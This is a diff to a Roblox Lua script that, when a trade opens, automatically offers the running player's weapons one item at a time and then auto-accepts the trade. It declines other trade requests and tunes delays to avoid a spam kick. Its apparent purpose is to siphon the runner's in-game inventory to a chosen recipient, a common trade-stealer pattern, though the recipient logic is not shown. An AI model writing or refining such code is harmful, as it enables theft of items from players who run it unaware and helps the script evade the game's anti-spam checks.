@@ -335,22 +335,30 @@ if #initialWeapons > 0 then
 				game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
 				task.wait(0)
 			elseif tradeStatus == "StartTrade" then
-				task.wait(0)
+				task.wait(0.2) -- Wait for trade GUI to initialize
 
 				local slotsUsed = 0
 				local i = 1
 
+				-- Put up to 4 unique items in the trade
 				while i <= #weaponsToSend and slotsUsed < 4 do
 					local weapon = weaponsToSend[i]
-					pcall(function()
-						game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(weapon.DataID, "Weapons", weapon.Amount)
-					end)
+					
+					-- Fire the remote for every single item in the stack
+					for _ = 1, weapon.Amount do
+						pcall(function()
+							game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(weapon.DataID, "Weapons")
+						end)
+						task.wait(0.01) -- Tiny wait to prevent remote spam kick
+					end
+
 					slotsUsed = slotsUsed + 1
 					table.remove(weaponsToSend, i)
-					task.wait(0.05)
+					task.wait(0.1) -- Wait for the items to register in the trade window
 				end
 
-				task.wait(0)
+				task.wait(0.5) -- CRITICAL: Wait for the server to process all items before accepting
+				
 				acceptTrade()
 				waitForTradeCompletion()
 				checkAndUpdateStatus()
